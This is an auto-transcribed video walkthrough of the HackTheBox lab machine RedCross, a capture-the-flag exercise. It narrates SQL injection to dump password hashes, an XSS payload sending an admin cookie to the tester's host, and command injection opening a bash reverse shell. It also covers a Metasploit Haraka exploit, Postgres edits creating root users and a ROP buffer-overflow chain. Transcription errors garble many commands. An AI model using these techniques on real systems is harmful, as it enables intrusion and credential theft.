 what's going on YouTube this is IPSec and when we doing Red Cross from active box and this box really shows the value of talking with people after you solve the box because you may be able to share tips or just completely different ways to accomplish different tasks so I'm going to be jumping over to a picture Oh XD f did of a flowchart of all the ways we have found to solve a Red Cross so starting off you can either find a PDF that has instructions on how to create an account or just guess the guest accounts password which is guest guest and once you have access to the page as a guest you can either replay as cookie to admin dot Red Cross HDB and gain access to it that way or you can play with the functions available to a guest to find a SQL injection that lets you dump the password has to Charles crack it and then gain access to admin Red Cross to H be threw trolls let's say you don't want to log in as guest at all there is a contact form that is vulnerable to cross-site scripting that has a user hitting a page so you can do a cross-site scripting attack against that simulated user to get his admin cookie and then access admin dot Red Cross HDB and that website is a site that lets you add firewall rules or users to the box if you whitelist your IP a service is exposed called Haraka that is exploitable and exploiting it gets you a shell as Penelope let's say you didn't want to do that you can add a user and then use FTP SSH to find source code to IPTC TLC which is a buffer overflow or you can just exploit the actual web application that adds firewall rules to do a command injection attack to get show sww data and then add a fake user and Postgres then gets a shell as Penelope with that shell as Penelope you can use a Postgres database to add a user to a sudoers group SSH SSH user run sudo and then get a root shell or you can add a user to the root group find an additional Postgres user which lets you modify the UID of a user to create a new user with a UID of 0 and then gain a root shell if you didn't want to touch adding users at all there is a program that i PT CTL that has a buffer overflow you can do a Chane to bypass Depp and ASOR to get a root shell so with all that being said let's try jumping into this box and hopefully we can make this box make sense because I'm gonna try to touch all these paths so let's get at it like every other box we begin with the end map using - as c4 default scripts as V enumerate versions Oh a output all formats playing the end metric and call it Red Cross and then the IP address which is 10 10 10 1 13 does take some time to run so I've already ran it looking at the results we have a few ports open SSH is open on port 22 and it's a debian box then we have Apache listening on both port 80 and 443 and they are directing us to the HTTPS site entrance htb so let's go over to Firefox and do 10 10 10 113 and we get the page as I found and this is because we don't have that DNS record for the website so let's go into a host file and add that so 10 10 10 113 and let's add red cross htb and introduce HDB and then when we refresh this webpage we get a certificate warning so let's click on advanced at exception and view the certificate to see if there's any other information in it so we can scroll down on the issuer we see the email as Penelope at Red Cross HDB and then nothing else in news so we got a user name here and the other thing I'm looking for is just other DNS names normally exposed and like alternate CN or something so we don't see anything so let's close that except this exception and now we can see the webpage the very first thing that stands out is just this question mark page equals login it's a common thing that some do-it-yourself PHP websites do so if we put index.php here we invalidate yes this is a PHP script and generally when you see this it's index.php which then includes a few PHP files so it's probably including header.php authentication dot PHP and then probably the variable of page and then appending dot php' to this login and then after that probably like photo dot PHP so if we can upload files we may have a potential way to do code execution or a local file inclusion through this page header but the very first thing I want to do is just enumerate the webserver so I'm going to send this over to burp suite and let's make sure burp suite is on is or intercept is off but that doesn't matter because I just want to go to the target tab and then right-click spider this host yes it is outside the scope and let's see sending our scopes to history yes sure and then we can click this down arrow and get what burp suite has found so I found index dot PHP and found two pages a webform we can just ignore it and then in pages it found actions dot PHP so we can validate that this page thing is just a pending dot PHP by going to slash pages and then actions dot PHP and we get a probably a redirect back to login if we do /pages slash we get a 404 and then we can do login dot PHP and we get just the login form nothing with the header or footer so looks like our assumption is correct on how this web page is working that being said let's just try to do a bunch of other enumeration so the very first thing I'm going to do is a go Buster on it so let's try to find other PHP scripts so let's copy this slash pages go back to our terminal and then do go Buster - h4 help we want to do - you for URL paste this in - w-4 would list and I'm going to do user share word list and then I'm actually going to use SEC list so oh user share cyclists that's why I wanted and then we want to grab foul names for PHP and let's see discovery common PHP file names this sounds like a good word list so let's put that for the word list - Oh file let's do intra pages PHP dot now unable to connect we have to add dash K to ignore SSL warnings and that go Buster is running so the next thing we're going to do is just hunt for directories so we'll do go Buster - you for your L and then HTTP intro dot Red Cross dot t-- b and then word list user share word list der Buster directory lists to 3 medium dot text - Oh out file will call this intra root dir dot txt what did I call the last one let's keep the same extensions dot out so we do dot L forgot the dash K and then while that goes we can do aw fuzz and try to find other DNS names so before I do that I'm going to do a find user share SEC list and grep this for DNS and let's see there should be a good DNS maybe this one sub sub domains text sounds like what we want so we can do W fuzz - H for help we're gonna do - capital H for the header and then host fuzz dot Red Cross dot h TB and then - you for your L I think so let's just put the URL here so HTTP 10 10 10 113 we don't have to do it by the host name because we're merely putting the host header and then - W for word list and then I can paste that subdomain list and let's hit enter and see what happens everything looks good so let's do - - HW to hide words 28 so now we should be brute-forcing valid host names we already got admin dot red Gauss DB most likely going back here we do have a go Buster result at documentation so let's do a another go Buster inside of that so let's copy this syntax go up here paste and what we want to do is change the URL to be introductory cross HDB / documentation then we can put the new out file to be into a - documentation and we'll do PDF txt and let's add the extensions PDF and txt so what this one's doing is going to go through this word list and append PDF and txt to them all and try them in the documentation directory so we got a bunch of enumeration going on and wfos looks like it went crazy let's just try piping that - first name t host names dot txt maybe that would be better if we cat hers names.txt okay that looks like it'll work so while all that's going on we can go back to this page and then just try a few things so let's try guessing the username and password or before you do that let's send it over to SQL map so try admin admin go to proxy intercept one and then log in and then right click copy the file and we want to put this in Red Cross and we'll call this log n dot request I probably should have called it like in chat log did not request but oh well we can do SQL map - our login dot request header I just realized yep it's redirecting us - yes a cell so I think it's - - force SSL that one looks good it's not just a 301 redirect click go yes and it now SQL map is running I am gonna do one thing and we're gonna assume this is my SQL to speed this up so I'm gonna do DBMS MySQL I'm also going to do - - batch so it doesn't really ask us anything so while that goes let's go over back to the web page and then trying various logins so first one gonna do is admin admin then we're going to try probably like Penelope password because her username was in that SSL cert so Penelope password and the next one I do is like Penelope Penelope so we're just trying to brute force the username so Penelope Penelope let's try guest guest and we get logged in as the guest user we also have a new thing down here a user ID and filter let's put user ID of 0 click filter see what happens nothing 1 and we get the message try 2 3 4 5 ok let's just go back to 1 since we know that is a valid query and let's just try putting like a single quote in here and we get a error message right away saying debug info you have a error in your SQL syntax so what I'm going to do is we're gonna send this one over to SQL map and kill this because we know there's SQL injection here since the error message is showing up so let's turn on intercept mode and let's just send it o equals one go back we can copy this request to a file and we'll do intro - oh requests and back in a terminal window let's do SQL map the same thing except instead of vlogging - request will do intra ODOT request - P for parameter will do oh and then - - batch force SSL and let this run so let's go back to the page and we want to manually test this for SQL injections and it looks like we have a page so if we just click go we have the output of the SQL injection so if we put a single quote here click go we have the SQL error so let's try recreating what this syntax error looks like so near this line we can copy actually just this portion yep so let's go back and if we paste it this is what it looks like and this is what we injected so we'll put injection point there so there's probably a select message from table where maybe message like five or dest like or injection point so when we want to inject we'll probably want to put a single quote and and parenthesis and then a comment so if we put a single quote parenthesis comment click go we get enough let's put a maybe five there percent and URL encode that let's do one friend c or one equals one maybe this will do it and we'll dump everything we're not getting any extra information out of here so let's get rid of one their single ticks and see if we get any more syntax so near five or destination like one equals one that's looking fine maybe we need limit ten click go and I'm not sure exactly why we're not getting information but it looks like SQL is fine so let's just play with trying to extract information in this error message so if we do now - plus - real quick we can see we're getting an error message so if we can make this syntax error show contents of the sequel query we can do SQL injection that way so let's try that with a sequel command called extract query so let's go back here and then we're going to change how we inject so instead of inject we're just going to put two exclamation points before and after I'm not going to copy these this is just so I know where inject is so we're going to put a single quote and there are parentheses to get out of this and then we're going to do and extract value and then we can just put a line break and then version close out of extract value and we can also do and one equals one I don't think we need that I think we can just do this we may need the end one equals one after it but I'm not positive so let's just copy this and we should see the Maria DB version if this works so do that highlight control you to convert to URL click go and we do the issue is it's being truncated a little bit because we're missing stuff before this period if we added something before a version like another line break so we can do concat zero X zero a comma then we'll see that so click go and there we go we have the full information a full version information of my sequel we can start getting database name information so if we just Google information schema my sequel we can get information that will let us build a complete SQL injection I guess and we've done this before but it's been a while so the first table I look at is schema ta I don't think it says exactly what it where its name is but we want the schema name and that is going to be the name of the database so let's go back to burp and then we can get rid of this version and what we want to do is a parenthesis and then select in the name of the column so schema name from the database which is information underscore schema then dot the table which will be schema ta and then end the parenthesis for that's left click go and we did not URL encode this so highlight our query press ctrl you to encode and sub query returned more than one row so then we can do a limit one click go and we see the very first name is information underscore schema that is the first database so if we do comma one it should show the next entry and what this does is show do does limit the number of lines and then I think the line number the number of lines anyways zero one will get the very first entry which is information schema one one will get the next entry which is Red Cross two one is nothing so we know the database is Red Cross so I'm going to highlight this control shift you copy go in terminal and let's do V SQL notes paste a query and this got DB name is Red Cross so the next thing we want to do is go back into information schema notes it's my sequel page whatever it is and the next table will probably be the tables because we know the database name is Red Cross so what tables are in of Red Cross so we got table name and table schema so we can do select instead of skeeball schema name we can do table name I can spell correctly from information schema instead of schema ta this was tables so tables and then we can do where schema ta is like Red Cross so I think this would do it and then we want to give the very first entry which is 0-1 so let's highlight this control you and pray not for a syntax error unknown column schema ta and we're across no table schema so table underscore schema click go and we get messages and requests users and that's it so we got messages request and users so I'm going to do the same thing copy this control shift you go to terminal paste and we got tables messages request and users so you could probably guess the next thing we want to do is grab the column names of users so if we go back here click back look for a table name called columns so we got information schema columns table and we want table name and column name so go back to burp so select column name from information schema dot columns where table schema it's gonna be table name like users and limit 0 1 so let's highlight this control you and see if we did this correctly unknown table column I think it's columns there we go so we got ID then the next one is going to be username password male role so it was ID what is to username/password roll and mail i think so that was password mail and roll so these are swamped and we have to copy the query and this is just for documentation purposes so control-shift you running code paste and there's that so now we can begin extracting usernames and passwords so we can do select username from instead of information schemas we can change the database to Red Cross and the table is gonna be users right table name users where we don't need aware so we can get rid of that we just need the limit so we can do zero one highlight control you click go and we get mission denied which is probably a syntax error so select user name from Red Cross dot users select maybe it's lowercase user name from Red Cross users see select username from users Red Cross dot users doesn't exist I thought it did was it user not below click go Red Cross dot users little case there we go has to be lowercase learn that one so that is case sensitive so one one and we can probably do Red Cross users to keep this all good but the first one was admin next users Penelope then we have Charles Tricia guest and then nothing so admin Penelope trolls Tricia guest and we can copy the syntax control shift Q paste and then the next thing we have to do is get passwords so select password from Red Cross users 0 1 click go did not URL encode this click go and we get the first one so admin is that and this is where knowing XPath is gonna help because this is limited or 32 characters so we also have to add substring and then after the first thing we can do from what is 30 it's 32 characters but we do this and that's three parentheses at the end I believe click go sequel syntax near select so we screwed something up maybe it's a to know let's see what is it so we got substring and the select limit 1 let's get rid of substring real quick and we can get rid of this to make sure we just didn't edit too much okay so we want substring maybe I didn't put a parenthesis after substring and then from 30 and it ends in upx click go and we got px here and this is the rest of the password so I think I just had screwed up putting a parentheses after substring it should be substring and then two parentheses so if we did the 32 we should just begin at KT zero because we know the last one ended in PX yep so we can do from 1 and change this one to one one copy go back here and we want Penelope to be this and then from 32 copy this paste and then trolls from 1 and this gonna be to copy this paste and then 30 to manually SQL injecting things is painful but this is essentially what SQL map does accept SQL map is going to do the double query which allows you to extract more information at a time than 32 characters so it doesn't have to do this second piece but again I think I did that in the enterprise video so if you want to see that go watch that so Tricia's begins at this and then from 32 and this and the last account is going to be guest which is a good one to grab because we know that password is already guessed so this will be validating that a cracker works so if we copy this and then 32 base that and we have to get the query we used so let's copy up the substring and paste I don't want URL encoding because it's hard to read there we go so that is the sequel injection portion so I guess we could go and take these and put them into the cracker so let's save this file then ssh to my favorite machine the kraken and then go into the hash cat folder go into hashes v red cross users open a new tab let's cat or SQ o notes grep for 2y and then we want to said and remove the two dashes okay we can copy this go back to a crack in paste and then we got to go and look at what hash formats we have so dot slash hash cat and then we can do a dash dash example formats maybe format dot slash hash cat - H graph example example hashes is what we want example - hashes and we can go down this list but I know that is a bcrypt which is dollar to store a dollar so it means anything with this is be equipped I think a means kind of like one of these ciphers and be clip maybe and oh five means the key stretching I forget exactly how b-cup works but it's gonna be a rather slow hash to crack so I'm not gonna do a big dictionary file so we'll just do dot slash hash cat - M 3,200 then we want - - I think user names because we have user name : the hash and then we can do the dictionary file so the hash is file which is hashes Red Cross and then the dictionary file which is opt with list rock you text and I think it's just - - username maybe then there we go and we'll see if this cracks any once it initializes everything okay we have started press s to get a time and just rock you is gonna take 10 hours so cracking this is not expected but we immediately got a hit Cookie Monster for the one that begins with bj5 Q so if we look that is gonna be Charles's hash and if we go all the way back to Red Cross I know you forgot probably what this page looks like but if we go here turn intercept off if it's on and session we can do Charles and Cookie Monster checking credentials and we login and we just get a few more messages so what an odd thing I wanted to point out before we jump to much further I'm just gonna kill this because we don't want to crack any more but the SQL map that we did before was odd because it should have made the service stop respond to us so I'm gonna get rid of this - p0 because there is a wife here that blocks connections which is what stopped SQL map so if we keep refreshing this page let's see if it ends up stops responding so it doesn't look like it's going to block us so let's go back and look at SQL map and we're seeing it's redirecting us to slash login so the cookie that we had for SQL map is no longer valid so we made a mistake earlier in the video and probably terminate the session that we gave SQL map so let's press f12 to open up I think configure what this is called but that's 12 to open up some pain and we'll copy this PHP session ID cookie and paste it in SQL map so it has a valid one that was the wrong clip would or do control shift insert there we go do this and let's see before we said it was redirecting us back to login as we saw here and now it is not doing that so if we refresh the page it's still not blocking us completely and wait I think there we go the server stopped responding to us so it's got some type of laughs that upon brute-forcing this o Bramber for X amount of times and X seconds it blocks you for one minute so I'm going to pause the video and we're gonna wait about a minute and then we're gonna resume it again and do a delay on SQL map and then begin looking at recons that we've done before so the page should no longer be blocking us so let us just do - - delay is equal to 1 and this is gonna make SQL map take a ridiculous we probably won't get blocked so just one way to evade the laughs I think it's the way equals once either the way equals 1 a delay space 1 and because of how slow it's moving to the next step I'm guessing it is equals 1 so so it doesn't take too long we're going to tell it the DBMS which is the database is my sequel and let this go in the background and continue poking at the page so if we go all the way back to or like go Buster and identifying things we did find a contact dot php' and there is also a slash account signup PDF inside of the documentation folder so if we just do slash documentation slash account - signup dot PDF we can see instructions on registering and account from Penelope Harris which is the admin we find out now so says please send a message to the intranet contact form sonicator users should be using the standard message so we'll end that session so this is one of the pieces before any authentication and they got a link here to the contact form but it says it's very important to subject and the message specify says credentials also specify the username in the body of the message and the form of username equals your desired name so we can do credentials and then username is equal to please subscribe and then contact phone or email we'll just put all fives and click wait did say what the password should be did I miss that credentials username otherwise password huh don't say password will do and password equals test let's see passing your query temporary credentials was guests guests so that is the way you were supposed to find I guess the guest credentials instead of guessing them but there is a idea if there is a contact form and someone is tasked to create that account then maybe there is some type of way you can do a cross-site scripting attack so let's try that out the first thing we want to do is set up a netcat listener so let's just do n CL v NP on port 80 and then go back into Firefox it's very important we put credentials here and then we can try putting a cross site scripting thing maybe here so we'll do script document dot write and then we'll do image source is equal to HTTP 10 10 14 3 slash please subscribe dot gif and then cookie is equal to document dot cookie and I think that is valid syntax I think we just got an N script and I should have made this bigger so everyone can read it so let's see script document dot write open it up add a single quote image source telling them hey go grab the image please subscribe dot gif and then append the cookie document cookie then open it back up this closes the image I think that's all correct and then we need a phone or email so 5 all Phi's click go oops someone is trying to do something nasty so let's go back and see if we can put HTML in any fields so the first field up there nope second field we know we can't because that's where cross-site scripting was let's try down at the phone number page and we can so let's put a cross-site scripting a quest down in the phone number and then we want credentials here and then detail we can do username is equal to epic making it appear exactly as they expect I'm not sure if that's required click contact processing your request and then we'll wait here for 3060 seconds oh we got a request already so we got a PHP session ID so we can try to use this one and the domain for this says admin and which is odd because if we look at the host names this is from I guess this started malfunctioning but there is a admin dot red crossed out h-2b as we did discover early in the video so let's do ed C host and put admin dot Red Cross dot h DB and we can try using that cookie so if we go here let's just get rid of the site admin dot Red Cross htb and then press f12 go to cookies and let's put the domain of this user or the PHP cess idea of this user paste and then refresh and we get access in now we didn't have to do that cross-site scripting we could have just taken the guest guest so let's refresh this page make sure we don't have a wall again we could use any PHP session ID here so if we did guest guest checking credentials come on and then we copied the session out of this one and put it here and then refreshed it still works so and we got guests here what was the other username is this gonna be Penelope paste refresh um paste Anna did I not copy 7c I did maybe there's only one session at a time which would be annoying let's see do I still have go back in my burp history and we want to post let's just search this for document dot right and we'll find the request that has it that is a super handy feature and burp suite pro is be able to search this at least I think it's Braille so this is actions click go and I think this is it so yep we got a new PHP session ID so if we copy this and go back to admin whose session is this admin so even guest has access here and if you had tried Charles over here it would work but if we try Charles and Cookie Monster not uh privileges and the same message gets displayed by guest so yeah and the session we can login with Charles Cookie Monster and I'm showing you is there were like a bajillion ways to get to this part of the box and then there's gonna be a bajillion ways to get past this part of the box so we're now Charles and have access the first thing that catches my eye is this user management so let's add the virtual user tip SEC and see what happens and we get credentials to the user if SEC and then this is the password so I'm going to copy that and we're gonna try logging into the box with SSH since that's the only other login venue so SSH if SEC at ten ten ten 1:13 paste the password and we get a login shell but if we do LS - la / there's a lot of things missing like we don't have a /proc so that is like instant notice that we're probably in like some type of CH root shell if I do like find home find is not a valid command so we're on a really stripped down shell we can go into home go into public and there's source so public SRC and we've got IP t CTL dot c so weak at that and we can copy the source code back to a box and this will be beneficial near the end of the video for a another potential way to do the box so let's V IPT CTL dot C paste we have to set mode to paste or a set pace to go there we go so we can also check out CD interface data there's nothing there so not too much interesting on this box we could go in at C we see group post passwd we can look at that see root and Penelope we can't go into Oh Penelope cuz I don't think home was even existing can't go into /root because of a mission so exit a shell and check out the next potential interesting thing and that was the firewall tables so let's go back just do em in Red Cross HDB network access whitelist IP address 10 10 14 3 I think is my IP if config tun 0 10 10 14 3 so I'm going to allow this IP and it told us it was a IP tables command so let's read and map this box so do and map - SC - sv o a and map and then we'll do red cross white list 10 10 10 1 1 3 and while n Matt keeps on running let's just keep poking at it we should always have recon going in the background while we work so let's turn intercept back on and start poking at the inputs of the webpage so let's do whitelist IP we'll just say 1 3 3 7 and see what this request looks like send this to repeater and then if it's doing iptables action allow + IP I know that's not a iptables function so I'm going to kind of ignore that action but iptables takes an IP so I'm going to try to escape that and do ping - see 110 1014 3 and let's make sure we have a tcp dump going so TCP dump - I ton zero ICMP and then we URL encode this click go and we get invalid IP address format so we can ignore that peace try looking at what a drop is so I deny so we got ID 13 action deny so let's do action deny ping - c1 10 10 14 3 copy this paste nothing in the response nothing here so that action didn't really do anything let's try the same exact thing after the IP on the remove rule click go and we get output even of ping and looking here we have ping so we know we have a way of code execution so let's do netcat LVN p 9001 and then we can go here and say the command we want to do is bash - I I think it's let's just google it real quick bash reverse shell pen test monkey I think intercept is on so let's take that off go here I think it's get that so go back to repeater I want bash - I that dev TCP 10 10 14 3 9001 0 and 1 like that your line code all this click go and nothing happened so what i'm gonna do is i'm going to add a bash - see around all that and then try it again click go we don't get a response back and looking here we have a shell as dub-dub-dub - data so you can do LS - la on slash and now we see all the directories acted like proc that init.d image we're in a real shell so let's upgrade the shell to one with head that has a pseudo time and also input PT y PT y dot spawn then bash and then we can do s TTY raw - echo for ground and let's check out the various pages so let's look well first let's we'll get verb HTML and see if there's any other websites we got admin default in intra if we look at default there's nothing there if we look at intra we have documentation x' and we can see we missed one file tech underscore note so DT if we look at pages we can see all the PHP scripts let's look at Annette dot PHP and we can see the password for the DB user DB cross let's just try this password like a su put that in so I did paste let's do su Penelope because we know she's a user doesn't work so let's go check out the information and admin so there is a and knit PHP and that is the same database let's take a look at pages and see how our actions work and we see it's connecting to a different database this one is Postgres and we see the host is one 27001 database name is Unix we got UNIX user manager and then a new password so let's try connecting to this Postgres database so P SQL - h1 27001 - capital u UNIX user MGR and then UNIX for the database name but the password I copied it paste it in and now we're in week list the database information with backslash D and we have some information we see tables like group table passwd table shadow table user ID etc so we have to figure out what information is in these tables so we do a backslash DT and okay backslash DT it should have listed more information we can try to is describe my terminal is all sorts of screwed up see how do we exit Postgres is it quit nope exit nope ctrl D okay let's do export term is equal to X term maybe that will help password we have to go get that again cat actions grab this password I'm not a post quest guy so okay that's not it we can probably do select star from passwd underscore table so select star from passwd underscore table and we can see information about our users we have virgil home for both Tricia and IPSec and we got the passwd s we also have the you you UID and GID so we can try creating a new user so let us do that so we want to do a insert into past WD underscore table and the column names we want is user name passed WD UID GID and I think it was home to and the values we want to put in it's going to be hip sack and then we want a password so we need to generate one so we can do open SSL to do that the command would be open SSL fast WD these are - one passwords and then we want to make the password please subscribe and I just realized we don't want to create the user upset because that user exists we need to do a modify command C value yep and then the password will be that and then we want UID 0 GID is 0 and then the home directory is going to be slash and I think that's it it doesn't look like it's it line arrow column slash doesn't exist syntax error on that so let's just do this in a different pain so it was insert into passwd underscore table username pass WD UID GID home to values yep the password maybe I need 0 end quote no it's an integer it should be fine and then slash you should be able to do that let's try pacing this in permission denied for elation passwd table so x /dt see how do we see what permissions we have maybe DP for permissions here we go it is DP so in the past of Gd table we have user name UNIX user manager I don't even know how to read this GID so user name pass WD and GID so I'm guessing that's what we can write as this user so we can't write the UID so let's go back and let's take UUID out so take that out and then we need that out and I hope my password is in another pane because I forget what I set the path it's password too so let's try this and it looks like it did insert and the password is please subscribe so we can do SSH if at 10 10 10 1 1 3 and login as it so now we can do a pre VEX check which we probably could have done as the HTTP user but we'll just do it now so we'll create the directory dub-dub-dub and then copy opt OS opt grep - I prove what it is when maybe he will do linen oom is that the Python nope that's a shell script so we'll do this one CP up linen oom and we'll make this blend SH and then just do it simple HTTP server we can leave that one port 8000 that's fine and we can curl ten ten fourteen three or eight thousand and then and pipe that over to bash so let's look at what we have we have set UID files and right away we have this IP t CTL which is interesting and we'll focus on that at the very end of the video because that is a buffer overflow going through all this that's a lot more than want to read so let's just manually enumerate I love going through the Etsy directory because that may contain passwords and in that letter new my think one of the checks is like checking for passwords and Etsy files so let's just mainly find this because I don't want to do a lot of reading I'm gonna do LS - LT - list files by modified time we see that the newest file is on the bottom so let's do an R at the bottom and are at the end of the command to reverse that so we can see the latest modified on the bottom the file that really sticks out to me are these PG SQL files so let's take a look at this NS SPG SQL - root Kampf and if we cut that we can see right here we get a new user to access that Postgres database with so let's do psql - h1 27001 - you your next NSS root and that password I don't feel like typing so let's copy this and the DB name goes at the end that is Unix maybe lowercase H for host yep lowercase H capital H is my sequel lowercase H is stress but taste that password in and now we're the eunuchs MSS root user so we can do /dp and we can see this looks the same but what is new it is going to be we have the user ID sequence and if we look over here let's DP we can see what the other users is I forget what this user name is but he doesn't have that so we should now be able to add a user so let's go back here and we have to do that command again so insert into passwd table username pass WD UID GID home door and then the values are gonna be the username let's do IM root the password let's create a new one open a cell passwd - one please comment there we go copy this hash go back to a shell base the password and 0 0 slash for the home directory and that should be it there we go we inserted it in so I'm gonna do ctrl D to exit the database and let us SSH so SSH I am root at 10 10 10 1 1 3 password please comment didn't work so let's make sure we're typing this correct didn't work let's try sq because maybe we just can't ssh as roo su i am rude paste and if we do an ID now we are UID 0 g ID 0 if we go into slash root we can now do it you see on route X so we don't spoil it and view is a file so there are two more things I want to show the first being the intended way to get shell on the box as outside of the jail so that is going to be require us to go back to the end map which never finished so let's take the scripts off and imagine we are right here again and we just did the firewall rule and we do an end map we can see these ports and if we check like the ports manually we can guess what FTP is that's an FTP server it's just gonna go into slash home of the jail nothing too interesting there we did SSH we SH to as our user and the password it gave us and we're inside of jail so we know what 80 and 443 is the next one down is 1025 so we'll do a netcat on 10 10 10 1 1 3 10 25 and it just hangs so I'm gonna add a dash V for verbose and then I'm just gonna put something and wait because it hasn't closed the socket yet so I want to wait for the server to close the socket and we can see what it says after a long wait we can see that the server responded it's an SMTP server called Haraka and running version 2.88 we can Google like Hakka changelog 2.88 and we can see when this was released let's see 2.88 we may have to scroll all the way down is there more next two point eight one four two point eight ten this is 2.88 july 20th 2016 there's been a lot of version since then and if we do a search boy on haka we can see two point eight nine had a SCE fix so we can do search point - x to view the script see what it's doing and glancing at the script I don't want to run this because like of notes of a like this that say I have no clue what I'm doing but hey it works I don't like running scripts that say things like that so let's check MSF to see if it has a script so MSF DB run that's just going to start the database and then execute MSF console and we're gonna see if it has a akka exploit module if it does we'll use that because chances are the person knows what they're doing here at least we know Metasploit won't go and install packages so search haka we can see an exploit is for it disclosure date 2017 the version released and 2016 so this is probably gonna work so we can use this module show options set serve host to be ten ten fourteen three sets of port to be eight thousand one female from would do if SEC at Red Cross HD be and will send an email to Penelope at Red Cross HD be actually from I'm gonna do Trisha we know Trisha exists from our SQL injection it really doesn't matter but it would just be fun to use users we have found from previous recon so set our host ten ten ten the box is one one three set a port to be ten twenty five and then set elbows to be tun 0 set L port to be eight thousand to show options and that looks fine so let's run this and invalid address show Advanced Options and let's not use generic shell TCP so we'll do set payload to be Linux x64 shell reverse TCP show options that looks better run this and we should get a shell and like 30 40 seconds because it is a bit slow so we have a command shell open if we do ID we have Penelope and in this point in this box we're at the same exact part as WWD da so we'll do Python - see and PT y PT y dot spawn and bash and then export term is equal to X term and what else do we have to do I don't think we have to do anything so we'll do the next part and that is address cells with a different GID that one would be sudo and that lets us bypass the need to read the NS SPG SQL to set a UID to zero so let's for cat a go-to for dub dub dub admin CD VAR dub dub dub HTML admin pages cat action dot PHP LS cat actions dot PHP and we can do psql - lowercase H one 27001 - capital u UNIX user MGR and then the database is Unix copy this password because it's gonna and then if we do slash I think it was DT this list the tables so we wanted to do insert into passwd crap let's go back I can't control D because that would kill that she'll let's get C groups a group and we want to grab that for pseudo which is group ID 27 so we can do insert into passwd table username past wdg ID home der values I am pseudo and do we have an open SSL command we can do please subscribe I guess go back here paste and then GID think we said 27 and then home der will be slash okay so I think that added the value no it didn't it's missing a quote okay let's copy this did not put a quote after the password I noticed that because the prompt says equal that on a new command and we're in a quote because it says a quote there so 27 home won't be slash there we go we have that insert so that is good how do we quit Postgres q /q there we go so we can do su I am sudo please subscribe we are now that user and we should be able to at OSU so we are root at Red Cross yet again so here is going to be the final challenge and that is the buffer overflow so let us just su to hip and I am GI d0 which is fine if I go into / root I cannot read the root text because stupid shell let's get out of this shell and do everything from a real shell so ID okay root root text is only readable by root not the group root so WCC root text doesn't work so it was an opt I P T CTL and there was this binary additionally we can get out of this 5 will be buff overflow so we have the file IPTC TLC we got this when we're in the jail so we can poke around looking at the source we have define buffer size 360 and going around here there is a interactive mode and we see input address is defined at 16 bytes input action at 10 we enter interactive mode print is doing an F get input action to assign the variable input action from the size of the buffer which was like 300 and stand it in so this is where the buffer overflow happens because input action is only ten bytes and the buffer size is up to 360 so we can copy 360 bytes into that ten so that's where the buffer overflow happens we have to figure out how to get to interactive and if we do - I then it does the interactive mode and there's the stir copies but yeah so let's copy i PT CTL back to a box and then we can play with it so base 64 - W 0 and then highlight mode go to the beginning okay get a buffer overflow V IPTC t l dot be 64 paste base 64 - D - IP t CTL make der buff and we'll move that there chmod plus x dot slash and we can execute it so there is the - I for interactive mode and this where the buffer overflow happens because without it we do less where is it i PT CTL dot C if we trace where this is let's do VI so we have syntax highlighting so let's see so I think what it's doing is it - I is there it goes that interactive prompt if not it just takes what's on earth v1 and assigns it straight to input action and input action is defined at ten bytes it never has that second buffer size which allows us to over allocate I believe so if we go out of this and we tried to do so let's do one one one all checks Pat's function unavailable so if we do show tons of A's one one one we never seg fault but if we do dot slash IPTC TL - I - go in interactive mode so tons of ace and then IP address of one one one we get a segfault so buffer of what we know is in that piece the first step is to identify where our overwrite is so we're going to do a gdb dot slash IPTC TL I'm going to set eggs to - I and then run it and I'm gonna background it with ctrl Z I forgot to do pattern create and we'll do 64 byte pattern because we know we only need to overflow ten to get it to start smashing the stack or maybe 16 or 18 I forget which one it was but 64 more than enough can continue let's just start the program again with run so we need show then we can pay stuff and then IP address 1 1 1 1 seg fault and we can see the RSP is what we want so we can do pattern offset and we can see it offset 30 is where a IP overwrite happens or naughty IP our IP so let's do them exploit pie and we want import struct import OS will need both of those eventually junk equals a times 30 payload is equal to show payload plus equals chunk payload plus equals backslash n which is a new line and then the IP and we'll do leat 1 3 3 7 so if we Python that exploit show print where do you place on 3 payload ok so we can do alt text and in gdb we can set eggs to be - I al txt so when we run this we get immediate seg fault and RSP VP is always so we know we're good we have their flow in the correct spot I said oh maybe P it should be RSP and we haven't began to overflow that so if we put B's then whatever flow it so let's try that real quick junk payload plus equals bunch of bees so this should appear in our SP run and be repeats 13 times so now we have successfully verified we can control where the program will go into execution so the next thing is let's do a check SEC and we have ESL are disabled on this binary it is it does have depth so we should do some type of rap chain because I can guess the ASOR is going to be enabled on the host so let us begin building a see what things are available in the binary itself so what we're going to do is object dump - D - J dot P ot to dump the procedural linkage table and we want to specify the file and we can see a bunch of things so I'm just gonna grab for at PLT and all these functions are what we can use for a rope chain because the binary itself doesn't have a SLR so we can reference these by their names so them exploit dot pi and we can set paste and put all these so we do have exec we have set UID so we should be good the only thing we need is SH so we can pass a shell to exec but if we can't find that we have STR copies so we can probably do a loop if we have to but since we have flush I'm guessing we can probably use that SH there so let's get out of this go back to gdb we can break main run and then do find SH and we refined the string SH which is going to be here so even have that so if we'd oh I did not save when I exited oh well so my bad about that we have SH s TR is equal to this and actually let's do a hack P 64 and we want to define the function P 64 and that's just going to convert it to a 64-bit address so def piece Ickx to 480 are then returned struck back little n DN a TDR there we go so let's see we got that let's do that object dump again so we can get our other functions we want quit up gdb objdump - D - JPL t IP grep at PLT and if all this is confusing you i'd recommend watching my bitter man video where i'm going more in depth into the buffer overflow this I'm just rushing through it because I'm getting tired of recording so let's see we need the exec VP linkage call P 60 is equal to P 64 and that is four hundred seven sixty seven sixty and then we need the set UID PLT is equal to p 64 400 780 okay we got those we'll also need an AW byte and that will just be piece 64 see the junks RT there so we need pop our di and we need a pop RSI because there's the first two arguments that are used for 64-bit syscall arguments and if we look at man exec V P we need to k2 arguments so this one will be RTI and this won't be our si so I'm just going to do radar - on IP - CTL and then I think it's /r pop RTI and we have a function right here and we need pop RSI and the easiest one is going to be this one and this is RSI or 15 Rhett and this is our di rat so we can exit radar go back in here pop our di is equal to P 64 0 X 400 de 3 and this is pop our di return and then pop our si is equal to P 64 400 de1 forgot the 0x and this is pop RSI pop r15 return the key thing to remember with the pop RSI we've got to put junk at this call so I think we have enough to make our chain so the very first thing we want to do is starting right here is where a rap chain begins so we want to make a call to set you ID and set you IDs first argument if we go into the main page is only going to be a UID number so we want to do payload plus equals pop RDI and then payload plus equals on all bite which is 0 and then payload plus equals set UID PLT and then the next part of the chain set UID 0 next where the chain is going to be the exec VP sh 0 so we want to do payload plus equals pop RDI and then is going to grab the next value on the stack which is going to be SH STR then it's going to want to pop Horace I we got to put something in that second argument payload plus equals null and because 